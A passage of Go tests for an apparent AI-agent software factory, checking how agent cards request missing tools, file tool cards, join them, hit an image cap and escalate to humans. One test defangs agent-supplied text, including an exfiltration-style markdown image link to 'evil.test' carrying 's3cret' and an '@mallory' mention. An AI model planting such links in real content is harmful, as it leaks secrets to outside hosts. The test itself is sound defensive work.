package factoryd

import (
	"context"
	"errors"
	"fmt"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/mock"
	"go.temporal.io/sdk/temporal"
	"go.temporal.io/sdk/workflow"

	"github.com/sebastianrueckerai/ai-software-factory-code/internal/policy"
	"github.com/sebastianrueckerai/ai-software-factory-code/internal/schema/schematest"
)

func TestToolImageSlug(t *testing.T) {
	for tool, want := range map[string]string{
		"ffmpeg":                               "ffmpeg",
		"FFmpeg 6":                             "ffmpeg-6",
		"  Chromium/Headless!! ":               "chromium-headless",
		"Python 3.12":                          "python-3-12",
		"!!!":                                  "tools",
		"":                                     "tools",
		"äöü":                                  "tools",
		"a-very-long-tool-name-that-runs-on":   "a-very-long-tool-name-that-runs",
		"abcdefghijklmnopqrstuvwxyz0123456789": "abcdefghijklmnopqrstuvwxyz012345",
	} {
		if got := toolImage(tool); got != want {
			t.Errorf("toolImage(%q) = %q, want %q", tool, got, want)
		}
	}
}

// The example of the tool card's body is a complete, valid images file.
func TestImagesExampleParses(t *testing.T) {
	f, findings := policy.ParseImagesFile([]byte(imagesExample))
	if len(findings) > 0 {
		t.Fatalf("findings = %q", findings)
	}
	s := f.Images["browser"]
	if len(s.Apt) == 0 || len(s.Upstream) != 1 || s.Upstream[0].Strip != 1 || len(s.Env) == 0 || len(s.Path) == 0 || len(s.Egress) == 0 {
		t.Fatalf("the example lacks a field: %+v", s)
	}
}

// parkRig is a runner whose policy in force pins the code repository's
// default image, a fake Forgejo holding its factory/images.yaml on main,
// and an asking card #41 running on its default image.
func parkRig(t *testing.T, images string, pins ...string) (*Runner, *fakeStore, *rollForgejo, *fakeWorkflows) {
	t.Helper()
	rf := &rollForgejo{files: map[string]map[string]string{}}
	if images != "" {
		rf.files[codeRepo+"@main"] = map[string]string{imagesPath: images}
	}
	fj, _ := rf.srv(t)
	store := newFakeStore()
	store.projects = []Project{seedProject(codeRepo)}
	v := testPolicyVersion()
	c := policy.ProjectConfig{Repository: codeRepo, Images: map[string]policy.ImagePin{}}
	for _, name := range pins {
		c.Images[name] = policy.ImagePin{Digest: "sha256:" + strings.Repeat("d", 64), Key: keyDefault, Tools: []string{"jq", "sox"}}
	}
	v.Projects["ai-software-factory-code"] = c
	wf := &fakeWorkflows{}
	r := &Runner{cfg: RunnerConfig{Policy: func() policy.Version { return v }, Workflows: wf}, store: store, forgejo: fj}
	for _, asker := range []Task{
		{ID: "t-asker", Status: "running", Repository: codeRepo, IssueNumber: 41, Priority: 2, Author: "sebastian"},
		{ID: "t-second", Status: "running", Repository: codeRepo, IssueNumber: 42, Priority: 1, Author: "sebastian"},
	} {
		if err := store.CreateTask(context.Background(), asker); err != nil {
			t.Fatal(err)
		}
	}
	return r, store, rf, wf
}

// toolCardRules are the rules every tool card's body ends with, the base's
// tools as sandboxTools names them.
const toolCardRules = "Rules:\n" +
	"- Every image is built FROM the sandbox base, which has only git, curl, ripgrep (rg), ssh, gcc and make, python3, PostgreSQL 17 (server and client, for tests). " +
	"Every image declares this project's own stack too: the cards that run on it build and test this project.\n" +
	"- A project has at most 4 images. default is the image of every card that names none.\n" +
	"- Prefer apt packages. Add an upstream line only for a file whose sha256 this card can verify, such as from a checksum file it reads; " +
	"the factory's build checks every sha256 and fails on a wrong one.\n" +
	"- egress names only the hosts the image's tools must reach.\n" +
	"- This card runs on the project's default image and never gets the tools it declares: declare them and finish; " +
	"the factory's build and the check of factory/images.yaml on this pull request test the file.\n\n"

// One ask files one tool card on the project's repository: a small child
// of the asking card on the cheap rung, which the asking card depends on,
// with the need, what the asking card's image holds as an entry to start
// from, the file on main, the format, the rules and the cap. The card
// waits in waiting-image. A card on its default image asks into an image
// named for its tool.
func TestParkForToolFilesOneCard(t *testing.T) {
	const file = "images:\n  default:\n    apt: [jq]\n"
	r, store, rf, wf := parkRig(t, file, "default")
	ctx := context.Background()
	p, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut the demo video to 10 s")
	if err != nil {
		t.Fatal(err)
	}
	if p.Ask != "" || p.Note != "" || p.Park.Refused != "" || p.Park.Target != "ffmpeg" || p.Park.ToolTask == "" || p.Park.ToolIssue != 31 || p.Park.CreatedAt.IsZero() {
		t.Fatalf("park = %+v, want a tool card for image ffmpeg", p)
	}
	card := store.tasks[p.Park.ToolTask]
	if card.Source != SourceToolRequest || card.Parent != "t-asker" || card.Rung != RungCheap || card.Size != "small" || card.Lane != policy.LaneReady ||
		card.Status != "queued" || card.Priority != 2 || card.IssueNumber != 31 || card.Repository != codeRepo {
		t.Fatalf("tool card = %+v", card)
	}
	body := "Card #41 (t-asker) needs ffmpeg, which its sandbox lacks: cut the demo video to 10 s\n\n" +
		"Add ffmpeg to image ffmpeg in factory/images.yaml. After this card merges, the factory builds the image, signs it and pins it, " +
		"and card #41 restarts on image ffmpeg from its branch, where it must still build and test this project.\n\n" +
		"Card #41 runs on image default now, which holds jq, sox and reaches no package registry. " +
		"Image ffmpeg starts as a copy of its entry under the new name; add ffmpeg to it:\n```\nimages:\n  ffmpeg:\n    apt:\n      - jq\n```\n\n" +
		"factory/images.yaml on main:\n```\n" + file + "```\n\n" +
		"The file's format, one complete example:\n```\n" + imagesExample + "```\n\n" +
		toolCardRules +
		"Acceptance:\n" +
		"- factory/images.yaml declares image ffmpeg, and ffmpeg is in it.\n" +
		"- factory/images.yaml passes the factory's check, which the policy gate runs on this pull request.\n\n" +
		"Size: small\nRung: cheap"
	if want := "Add ffmpeg to image ffmpeg\n\n" + body; card.Objective != want {
		t.Fatalf("objective:\n%s\nwant:\n%s", card.Objective, want)
	}
	if !slices.Equal(rf.issues, []string{"Add ffmpeg to image ffmpeg\n\n" + body}) {
		t.Fatalf("issues = %q", rf.issues)
	}
	if f := ReadyFindings("", card.Objective, card.Size, nil); len(f) > 0 {
		t.Fatalf("the tool card fails the ready check: %q", f)
	}
	if !slices.Equal(store.deps["t-asker"], []string{p.Park.ToolTask}) || !slices.Equal(rf.deps, []string{"41 on 31"}) {
		t.Fatalf("deps %v, issue dependencies %v: want #41 on the tool card", store.deps["t-asker"], rf.deps)
	}
	if !slices.Equal(wf.started, []string{p.Park.ToolTask}) {
		t.Fatalf("started = %v, want the tool card's workflow", wf.started)
	}
	if got := store.tasks["t-asker"].Status; got != "waiting-image" {
		t.Fatalf("asking card is %s, want waiting-image", got)
	}
	if row, ok, _ := store.ImagePark(ctx, "t-asker"); !ok || row.Project != "ai-software-factory-code" || row.Target != "ffmpeg" || row.Tool != "ffmpeg" ||
		row.Need != "cut the demo video to 10 s" || row.ToolTask != p.Park.ToolTask || row.WokenAt != nil {
		t.Fatalf("park row = %+v", row)
	}
	// a retry of the activity finds its park: no second card
	if again, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut the demo video to 10 s"); err != nil || again.Park.ToolTask != p.Park.ToolTask || len(rf.issues) != 1 {
		t.Fatalf("retry = %+v %v, issues %d", again, err, len(rf.issues))
	}

	second, err := r.ParkForTool(ctx, "t-second", "SoX 14", "mix the trailer's sound")
	if err != nil {
		t.Fatal(err)
	}
	if second.Park.Target != "sox-14" || second.Park.ToolTask == p.Park.ToolTask || len(rf.issues) != 2 ||
		!strings.HasPrefix(rf.issues[1], "Add SoX 14 to image sox-14\n\n") {
		t.Fatalf("second park = %+v, issues %q: want its own card for image sox-14", second, rf.issues)
	}
}

// The tool card tells what the asking card's image holds, as an entry the
// target extends: the image's own entry where the card asks into it, the
// factory image's stack where the card runs on the factory's image.
func TestToolCardStartsFromTheAskersImage(t *testing.T) {
	const file = "images:\n  default:\n    apt: [jq]\n  video:\n    apt: [ffmpeg]\n    egress: [cdn.example.org]\n"
	r, store, _, _ := parkRig(t, file, "video")
	ctx := context.Background()
	c := r.cfg.Policy().Projects["ai-software-factory-code"]
	c.Images["video"] = policy.ImagePin{Digest: "sha256:" + strings.Repeat("d", 64), Key: keyDefault, Tools: []string{"ffmpeg"}, Egress: []string{"cdn.example.org"}}
	tk := store.tasks["t-asker"]
	tk.Image = "video"
	store.tasks["t-asker"] = tk
	p, err := r.ParkForTool(ctx, "t-asker", "sox", "mix the sound")
	if err != nil {
		t.Fatal(err)
	}
	want := "Card #41 runs on image video now, which holds ffmpeg and reaches cdn.example.org. Add sox to its entry:\n" +
		"```\nimages:\n  video:\n    apt:\n      - ffmpeg\n    egress:\n      - cdn.example.org\n```\n\n"
	if obj := store.tasks[p.Park.ToolTask].Objective; !strings.Contains(obj, want) {
		t.Fatalf("objective %q lacks %q", obj, want)
	}
	// default has no pin: the card ran on the factory's image
	stack, err := imagesEntry("ffmpeg", FactoryStack())
	if err != nil {
		t.Fatal(err)
	}
	q, err := r.ParkForTool(ctx, "t-second", "ffmpeg", "cut")
	if err != nil {
		t.Fatal(err)
	}
	want = "Card #42 runs on the factory's image now: the sandbox base with Go 1.26 and Node 24 with npm. " +
		"Image ffmpeg starts from this entry, the same stack; add ffmpeg to it:\n```\n" + stack + "```\n\n"
	if obj := store.tasks[q.Park.ToolTask].Objective; !strings.Contains(obj, want) {
		t.Fatalf("objective %q lacks %q", obj, want)
	}
	if !strings.Contains(stack, "      - name: go\n        url: https://go.dev/dl/go1.26.9.linux-amd64.tar.gz\n") {
		t.Fatalf("stack entry = %q", stack)
	}
}

// A second ask for the same image joins the open tool card: the comment
// on its issue and the need in its brief, no second card; the joining card
// depends on it too. The open card is found by the card itself: a later
// park of the card that filed it does not hide it.
func TestParkForToolJoinsTheOpenCard(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	for _, id := range []string{"t-asker", "t-second"} {
		tk := store.tasks[id]
		tk.Image = "video"
		store.tasks[id] = tk
	}
	first, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut the demo video")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(store.tasks[first.Park.ToolTask].Objective, "factory/images.yaml on main: none yet; create it.\n\n") {
		t.Fatalf("objective without a file = %q", store.tasks[first.Park.ToolTask].Objective)
	}
	// the asker parks again elsewhere: its row names another image now
	if _, err := store.ParkImage(ctx, ImagePark{Task: "t-asker", Project: "ai-software-factory-code", Target: "docs", Tool: "pandoc"}, true); err != nil {
		t.Fatal(err)
	}
	before := store.tasks[first.Park.ToolTask].Objective
	second, err := r.ParkForTool(ctx, "t-second", "sox", "mix the trailer's sound")
	if err != nil {
		t.Fatal(err)
	}
	if second.Park.ToolTask != first.Park.ToolTask || second.Park.Target != "video" || second.Park.ToolIssue != 31 {
		t.Fatalf("second park = %+v, want it to join %s", second, first.Park.ToolTask)
	}
	join := "Card #42 (t-second) needs sox in image video too: mix the trailer's sound"
	if len(rf.issues) != 1 || !slices.Equal(rf.comments, []string{"31 " + join}) {
		t.Fatalf("issues %d, comments %q: want one card and the join on #31", len(rf.issues), rf.comments)
	}
	if got := store.tasks[first.Park.ToolTask].Objective; got != before+"\n\n"+join {
		t.Fatalf("objective after the join = %q", got)
	}
	if !slices.Equal(store.deps["t-second"], []string{first.Park.ToolTask}) || !slices.Equal(rf.deps, []string{"41 on 31", "42 on 31"}) {
		t.Fatalf("deps %v, issue dependencies %v", store.deps, rf.deps)
	}
	if store.tasks["t-second"].Status != "waiting-image" {
		t.Fatalf("second card is %s", store.tasks["t-second"].Status)
	}

	// a merged tool card is open no more: the next ask files a new one
	tool := store.tasks[first.Park.ToolTask]
	merged := time.Now()
	tool.Status, tool.FinishedAt = "merged", &merged
	store.tasks[tool.ID] = tool
	store.tasks["t-asker"] = Task{ID: "t-asker", Status: "running", Repository: codeRepo, IssueNumber: 41, Image: "video"}
	third, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut it again")
	if err != nil {
		t.Fatal(err)
	}
	if third.Park.ToolTask == first.Park.ToolTask || len(rf.issues) != 2 {
		t.Fatalf("third park = %+v, issues %d: want a new card", third, len(rf.issues))
	}
}

// The park is recorded with its tool card's id before the card is filed:
// a retry after the row finds the id and files the card under it, once.
func TestParkForToolRetryFilesThePreassignedCard(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	if _, err := store.ParkImage(ctx, ImagePark{Task: "t-asker", Project: "ai-software-factory-code", Target: "ffmpeg", Tool: "ffmpeg", Need: "cut",
		ToolTask: "t-pre"}, true); err != nil {
		t.Fatal(err)
	}
	for range 2 {
		p, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut")
		if err != nil || p.Park.ToolTask != "t-pre" || p.Park.ToolIssue != 31 {
			t.Fatalf("park = %+v %v", p, err)
		}
	}
	if len(rf.issues) != 1 || store.tasks["t-pre"].Parent != "t-asker" || !slices.Equal(store.deps["t-asker"], []string{"t-pre"}) {
		t.Fatalf("issues %d, card %+v, deps %v: want the one card under the preassigned id", len(rf.issues), store.tasks["t-pre"], store.deps)
	}
}

// A tool card declares tools and never gets them: its own request_tool is
// refused at once, telling it to declare the tool and finish.
func TestParkForToolRefusesTheToolCard(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	if err := store.CreateTask(ctx, Task{ID: "t-tool", Status: "running", Repository: codeRepo, IssueNumber: 50, Source: SourceToolRequest, Parent: "t-asker"}); err != nil {
		t.Fatal(err)
	}
	p, err := r.ParkForTool(ctx, "t-tool", "ffmpeg", "check the encoder")
	if err != nil {
		t.Fatal(err)
	}
	want := "The tool ffmpeg did not arrive: this card declares tools in factory/images.yaml, and its own sandbox never gets them. " +
		"This session runs on the image the card ran on before. Declare the tool and finish: the factory's build and the check of factory/images.yaml on this pull request test the file."
	if p.Note != want || p.Ask != "" || len(rf.issues) != 0 || len(store.deps["t-tool"]) != 0 || store.tasks["t-tool"].Status != "running" {
		t.Fatalf("park = %+v, issues %d, deps %v; want the note %q", p, len(rf.issues), store.deps["t-tool"], want)
	}
}

// A new image past the project's MaxImages names, pinned or declared, is
// refused at once: no card, the card keeps running for its next session,
// told that a human must free a name. Any ask after a refused park goes
// to a human, and the refusal is spent: the ask after the human's answer
// is judged afresh. An ask for a name the project has passes the cap.
func TestParkForToolRefusesANewImageAtTheCap(t *testing.T) {
	const file = "images:\n  default:\n    apt: [jq]\n  video:\n    apt: [ffmpeg]\n  docs:\n    apt: [pandoc]\n"
	r, store, rf, _ := parkRig(t, file, "default", "browser")
	ctx := context.Background()
	fact := "image sox would be new, and project ai-software-factory-code has 4 images already (browser, default, docs, video), the most a project may have"
	p, err := r.ParkForTool(ctx, "t-asker", "sox", "mix the sound")
	if err != nil {
		t.Fatal(err)
	}
	note := "The tool sox did not arrive: " + fact + ". This session runs on the image the card ran on before. " +
		"A human must free a name: ask one with escalate_to_human, or go on without the tool."
	if p.Park.Refused != fact || p.Note != note || p.Ask != "" || p.Park.ToolTask != "" || len(rf.issues) != 0 {
		t.Fatalf("park = %+v, issues %d; want the cap's refusal, no card", p, len(rf.issues))
	}
	if store.tasks["t-asker"].Status != "running" {
		t.Fatalf("refused card is %s, want running", store.tasks["t-asker"].Status)
	}
	// an ask into a declared image, which the cap lets pass, follows a refusal: a human
	again, err := r.ParkForTool(ctx, "t-asker", "video", "cut the clip")
	if err != nil {
		t.Fatal(err)
	}
	ask := "The agent asks again for a tool: video on image video, after the factory refused its last ask (sox on image sox): " + fact + "\n" +
		"Why: cut the clip\n" +
		"Recommendation: free an image name in factory/images.yaml, then answer; or answer how the card goes on without the tool, or close this issue to end the card."
	if again.Ask != ask || again.Note != "" || len(rf.issues) != 0 || escalationSource(ask) != "image" {
		t.Fatalf("the ask after a refusal = %+v, want the question %q", again, ask)
	}
	if row, _, _ := store.ImagePark(ctx, "t-asker"); row.Refused != "" || row.WokenAt == nil || row.Target != "video" {
		t.Fatalf("row after the human's turn = %+v, want the refusal spent", row)
	}
	third, err := r.ParkForTool(ctx, "t-asker", "sox", "mix the sound")
	if err != nil || third.Ask != "" || third.Park.Refused != fact {
		t.Fatalf("the ask after the answer = %+v %v, want a fresh refusal", third, err)
	}
	// a card on image video asks into video: no new name
	tk := store.tasks["t-second"]
	tk.Image = "video"
	store.tasks["t-second"] = tk
	if p, err := r.ParkForTool(ctx, "t-second", "sox", "mix the sound"); err != nil || p.Park.Refused != "" || p.Park.Target != "video" || len(rf.issues) != 1 {
		t.Fatalf("an ask into a declared image = %+v %v, issues %d", p, err, len(rf.issues))
	}
}

// The human's question after a refused park points at what refused it: a
// tool card that closed unmerged, one merged without the image, or one
// whose image's builds failed.
func TestParkForToolAfterAWakeRefusal(t *testing.T) {
	for refusal, advice := range map[string]string{
		"#31 closed without a merge":                                                       "see why #31 closed, and reopen it or file the tool's card again, then answer",
		"#31 merged without declaring image ffmpeg":                                        "make factory/images.yaml declare image ffmpeg with the tool, then answer",
		"#31 merged, but image ffmpeg's build failed 3 times; the builder's run shows why": "read the builder's run, correct the image's entry in factory/images.yaml, then answer",
	} {
		r, store, rf, _ := parkRig(t, "", "default")
		ctx := context.Background()
		if _, err := store.ParkImage(ctx, ImagePark{Task: "t-asker", Project: "ai-software-factory-code", Target: "ffmpeg", Tool: "ffmpeg", ToolTask: "t-31",
			Refused: refusal}, false); err != nil {
			t.Fatal(err)
		}
		p, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut")
		want := "The agent asks again for a tool: ffmpeg on image ffmpeg, after the factory refused its last ask (ffmpeg on image ffmpeg): " + refusal + "\nWhy: cut\n" +
			"Recommendation: " + advice + "; or answer how the card goes on without the tool, or close this issue to end the card."
		if err != nil || p.Ask != want || len(rf.issues) != 0 {
			t.Fatalf("%s: park = %+v %v, issues %d; want %q", refusal, p, err, len(rf.issues), want)
		}
	}
}

// An ask for the tool whose park on the same image arrived, from a card
// that runs on that image, goes to a human: the automation's loop would
// file the same card again.
func TestParkForToolAfterTheImageArrived(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default", "ffmpeg")
	ctx := context.Background()
	if _, err := store.ParkImage(ctx, ImagePark{Task: "t-asker", Project: "ai-software-factory-code", Target: "ffmpeg", Tool: "ffmpeg", ToolTask: "t-31"}, false); err != nil {
		t.Fatal(err)
	}
	tk := store.tasks["t-asker"]
	tk.Image = "ffmpeg"
	store.tasks["t-asker"] = tk
	p, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut")
	want := "The agent asks again for a tool: image ffmpeg arrived with jq, sox; the agent asks for ffmpeg again\nWhy: cut\n" +
		"Recommendation: see whether image ffmpeg holds the tool where the card looks for it, then answer with what you find; or close this issue to end the card."
	if err != nil || p.Ask != want || len(rf.issues) != 0 || escalationSource(want) != "image" {
		t.Fatalf("park = %+v %v, issues %d; want %q", p, err, len(rf.issues), want)
	}
	// another tool is a new ask
	if p, err := r.ParkForTool(ctx, "t-asker", "sox", "mix"); err != nil || p.Ask != "" || len(rf.issues) != 1 {
		t.Fatalf("another tool = %+v %v, issues %d", p, err, len(rf.issues))
	}
}

// A card that does not run on the image its park's wake brought (a human
// answered the 24 h question, the image arrived after) takes it at its
// next ask for the tool: the woken park, which the workflow takes at once.
func TestParkForToolTakesTheArrivedImage(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default", "ffmpeg")
	ctx := context.Background()
	woken, err := store.ParkImage(ctx, ImagePark{Task: "t-asker", Project: "ai-software-factory-code", Target: "ffmpeg", Tool: "ffmpeg", Need: "cut", ToolTask: "t-31"}, false)
	if err != nil {
		t.Fatal(err)
	}
	p, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut it again")
	if err != nil || p.Ask != "" || p.Note != "" || p.Park.Target != "ffmpeg" || p.Park.WokenAt == nil || !p.Park.CreatedAt.Equal(woken.CreatedAt) || len(rf.issues) != 0 {
		t.Fatalf("park = %+v %v, issues %d; want the woken park", p, err, len(rf.issues))
	}
	if store.tasks["t-asker"].Status != "running" {
		t.Fatalf("card is %s, want running: it takes the image at once", store.tasks["t-asker"].Status)
	}
}

// A join matches the card's whole line: a tool whose name begins an
// earlier ask's (go after golang) joins too. A retry of the join changes
// nothing, and one after a lost comment posts it once.
func TestParkForToolJoinMatchesTheWholeLine(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	tk := store.tasks["t-asker"]
	tk.Image = "video"
	store.tasks["t-asker"] = tk
	first, err := r.ParkForTool(ctx, "t-asker", "golang", "build the encoder")
	if err != nil {
		t.Fatal(err)
	}
	tk.Status = "running"
	store.tasks["t-asker"] = tk
	before := store.tasks[first.Park.ToolTask].Objective
	join := "Card #41 (t-asker) needs go in image video too: build"
	for range 2 {
		p, err := r.ParkForTool(ctx, "t-asker", "go", "build")
		if err != nil || p.Park.ToolTask != first.Park.ToolTask {
			t.Fatalf("park = %+v %v", p, err)
		}
		if got := store.tasks[first.Park.ToolTask].Objective; got != before+"\n\n"+join || !slices.Equal(rf.comments, []string{"31 " + join}) {
			t.Fatalf("objective %q, comments %q: want the join once", got, rf.comments)
		}
	}
	rf.comments = nil
	if _, err := r.ParkForTool(ctx, "t-asker", "go", "build"); err != nil || !slices.Equal(rf.comments, []string{"31 " + join}) {
		t.Fatalf("a retry after a lost comment: %v, comments %q", err, rf.comments)
	}
}

// A card whose image is named default runs on its project's default
// image: its ask goes into an image named for the tool, from the factory
// image's stack where default has no pin, its start parks on nothing, and
// an arrival of image default leaves a card naming none.
func TestParkForToolTakesDefaultAsTheDefaultImage(t *testing.T) {
	r, store, rf, _ := parkRig(t, "")
	ctx := context.Background()
	for _, id := range []string{"t-asker", "t-second"} {
		tk := store.tasks[id]
		tk.Image = "default"
		store.tasks[id] = tk
	}
	p, err := r.ParkForTool(ctx, "t-asker", "chromium", "screenshot the page")
	if err != nil {
		t.Fatal(err)
	}
	stack, err := imagesEntry("chromium", FactoryStack())
	if err != nil {
		t.Fatal(err)
	}
	want := "Card #41 runs on the factory's image now: the sandbox base with Go 1.26 and Node 24 with npm. " +
		"Image chromium starts from this entry, the same stack; add chromium to it:\n```\n" + stack + "```\n\n"
	if obj := store.tasks[p.Park.ToolTask].Objective; p.Park.Target != "chromium" || !strings.Contains(obj, want) || len(rf.issues) != 1 ||
		!strings.HasPrefix(rf.issues[0], "Add chromium to image chromium\n\n") {
		t.Fatalf("park %+v, objective %q; want image chromium from the factory's stack", p, obj)
	}
	var app *temporal.ApplicationError
	if _, err := r.ParkForTool(ctx, "t-second", "", ""); !errors.As(err, &app) || !app.NonRetryable() {
		t.Fatalf("a start on image default = %v, want a terminal refusal", err)
	}
	if _, err := r.ImageArrived(ctx, "t-second", "default", ""); err != nil || store.tasks["t-second"].Image != "" {
		t.Fatalf("an arrival of default: %v, image %q; want none named", err, store.tasks["t-second"].Image)
	}
}

// The tool and the need are the agent's: the tool card's title and body
// and a join's comment carry them as an escalation does, no mention and no
// link off the allowlist live.
func TestToolCardNeutralisesTheAgentsText(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	v := r.cfg.Policy()
	v.Document.LinkHosts = []string{"docs.example.org"}
	r.cfg.Policy = func() policy.Version { return v }
	r.forgejo.PublicURL = "https://git.example"
	ctx := context.Background()
	for _, id := range []string{"t-asker", "t-second"} {
		tk := store.tasks[id]
		tk.Image = "video"
		store.tasks[id] = tk
	}
	first, err := r.ParkForTool(ctx, "t-asker", "ffmpeg @mallory", hostile)
	if err != nil {
		t.Fatal(err)
	}
	want := "Add ffmpeg ＠mallory to image video\n\nCard #41 (t-asker) needs ffmpeg ＠mallory, which its sandbox lacks: " + hostileOut + "\n\n"
	if len(rf.issues) != 1 || !strings.HasPrefix(rf.issues[0], want) || strings.Contains(rf.issues[0], "evil.test") || strings.Contains(rf.issues[0], "@mallory") {
		t.Fatalf("issues %q, want the card opening %q", rf.issues, want)
	}
	if obj := store.tasks[first.Park.ToolTask].Objective; !strings.HasPrefix(obj, want) {
		t.Fatalf("objective %q, want it opening %q", obj, want)
	}
	for range 2 {
		if _, err := r.ParkForTool(ctx, "t-second", "sox", "mix it ![x](https://evil.test/p?d=s3cret)"); err != nil {
			t.Fatal(err)
		}
	}
	join := "Card #42 (t-second) needs sox in image video too: mix it ![x](hxxps://evil[.]test/p?d=s3cret)"
	if !slices.Equal(rf.comments, []string{"31 " + join}) || !strings.HasSuffix(store.tasks[first.Park.ToolTask].Objective, "\n\n"+join) {
		t.Fatalf("comments %q, objective %q; want the join once, %q", rf.comments, store.tasks[first.Park.ToolTask].Objective, join)
	}
	if row, _, _ := store.ImagePark(ctx, "t-second"); row.Need != "mix it ![x](https://evil.test/p?d=s3cret)" {
		t.Fatalf("park row %+v, want the need as the agent asked it", row)
	}
}

// A tool card a session started is joined no more, as its session read
// its brief: a second ask for the image files a card of its own.
func TestParkForToolJoinsOnlyACardNotStarted(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	for _, id := range []string{"t-asker", "t-second"} {
		tk := store.tasks[id]
		tk.Image = "video"
		store.tasks[id] = tk
	}
	first, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut")
	if err != nil {
		t.Fatal(err)
	}
	tool := store.tasks[first.Park.ToolTask]
	tool.Status = "running"
	store.tasks[tool.ID] = tool
	second, err := r.ParkForTool(ctx, "t-second", "sox", "mix")
	if err != nil {
		t.Fatal(err)
	}
	if second.Park.ToolTask == first.Park.ToolTask || len(rf.issues) != 2 || len(rf.comments) != 0 || store.tasks[first.Park.ToolTask].Objective != tool.Objective {
		t.Fatalf("second park %+v, issues %d, comments %q; want a card of its own", second, len(rf.issues), rf.comments)
	}
}

// A park that ends without its image drops the card's dependency on its
// tool card, in task_deps and on Forgejo, where an open one keeps the
// card's issue from closing. A Forgejo that fails the drop fails the
// activity, so its retry drops it; a second leave changes nothing.
func TestLeaveImagePark(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	p, err := r.ParkForTool(ctx, "t-asker", "ffmpeg", "cut")
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(store.deps["t-asker"], []string{p.Park.ToolTask}) || !slices.Equal(rf.deps, []string{"41 on 31"}) {
		t.Fatalf("deps %v, issue dependencies %v", store.deps["t-asker"], rf.deps)
	}
	rf.depsDown = true
	if err := r.LeaveImagePark(ctx, "t-asker", p.Park.ToolTask); err == nil || !slices.Equal(rf.deps, []string{"41 on 31"}) {
		t.Fatalf("leave with Forgejo down = %v, issue dependencies %v; want the error and the dependency kept", err, rf.deps)
	}
	rf.depsDown = false
	for range 2 {
		if err := r.LeaveImagePark(ctx, "t-asker", p.Park.ToolTask); err != nil {
			t.Fatal(err)
		}
		if len(store.deps["t-asker"]) != 0 || len(rf.deps) != 0 {
			t.Fatalf("deps %v, issue dependencies %v; want none", store.deps["t-asker"], rf.deps)
		}
	}
}

// An ask on the configuration repository is refused at once: its tree
// holds no images file.
func TestParkForToolRefusesTheConfigurationRepository(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	r.Imager = &Imager{Config: &ForgejoConfig{Repo: Repo{Owner: "sf", Name: "ai-software-factory-code"}}}
	p, err := r.ParkForTool(context.Background(), "t-asker", "ffmpeg", "cut")
	if err != nil {
		t.Fatal(err)
	}
	want := "The tool ffmpeg did not arrive: this card's repository is the factory's configuration repository, which declares no sandbox images. " +
		"This session runs on the image the card ran on before. Go on without the tool, or ask a human with escalate_to_human."
	if p.Note != want || p.Park.ToolTask != "" || len(rf.issues) != 0 || store.tasks["t-asker"].Status != "running" {
		t.Fatalf("park %+v, issues %d; want the note %q", p, len(rf.issues), want)
	}
}

// A session start whose image has no pin parks on that image with no tool
// card.
func TestParkForToolWithoutATool(t *testing.T) {
	r, store, rf, _ := parkRig(t, "", "default")
	ctx := context.Background()
	tk := store.tasks["t-asker"]
	tk.Image = "video"
	store.tasks["t-asker"] = tk
	p, err := r.ParkForTool(ctx, "t-asker", "", "")
	if err != nil {
		t.Fatal(err)
	}
	if p.Park.Target != "video" || p.Park.ToolTask != "" || p.Park.Refused != "" || p.Ask != "" || p.Note != "" || len(rf.issues) != 0 {
		t.Fatalf("park = %+v, issues %d", p, len(rf.issues))
	}
	if store.tasks["t-asker"].Status != "waiting-image" {
		t.Fatalf("card is %s", store.tasks["t-asker"].Status)
	}
	tk.Image = ""
	store.tasks["t-asker"] = tk
	var app *temporal.ApplicationError
	if _, err := r.ParkForTool(ctx, "t-asker", "", ""); !errors.As(err, &app) || !app.NonRetryable() {
		t.Fatalf("a card on its default image = %v, want a terminal refusal", err)
	}
}

// The arrival sets the card's image and names the image's tools.
func TestImageArrived(t *testing.T) {
	r, store, _, _ := parkRig(t, "", "default", "ffmpeg")
	line, err := r.ImageArrived(context.Background(), "t-asker", "ffmpeg", "ffmpeg")
	if err != nil {
		t.Fatal(err)
	}
	if line != "The tool ffmpeg arrived: this session runs on image ffmpeg (jq, sox)." || store.tasks["t-asker"].Image != "ffmpeg" {
		t.Fatalf("line %q, image %q", line, store.tasks["t-asker"].Image)
	}
	if line, err := r.ImageArrived(context.Background(), "t-second", "video", ""); err != nil || line != "" || store.tasks["t-second"].Image != "video" {
		t.Fatalf("a pin's arrival = %q %v, image %q; want no line", line, err, store.tasks["t-second"].Image)
	}
}

// image_parks keeps one row per task, its latest park: ParkImage replaces
// it and stamps it, ImagePark reads it with its tool card's issue,
// OpenToolCard finds the open tool card of a repository's image by the
// card itself, OpenImageParks the waiting rows of cards that have not
// ended, ProjectImageParks those of one project, and WakeImagePark wakes
// the park it names only.
func TestPGStoreImageParks(t *testing.T) {
	ctx := context.Background()
	s, err := OpenStore(ctx, schematest.DSN(t, "factoryd"))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	if _, err := s.db.ExecContext(ctx, `TRUNCATE image_parks`); err != nil {
		t.Fatal(err)
	}
	suffix := fmt.Sprint(time.Now().UnixNano())
	asker, other, tool := "t-ask-"+suffix, "t-oth-"+suffix, "t-tool-"+suffix
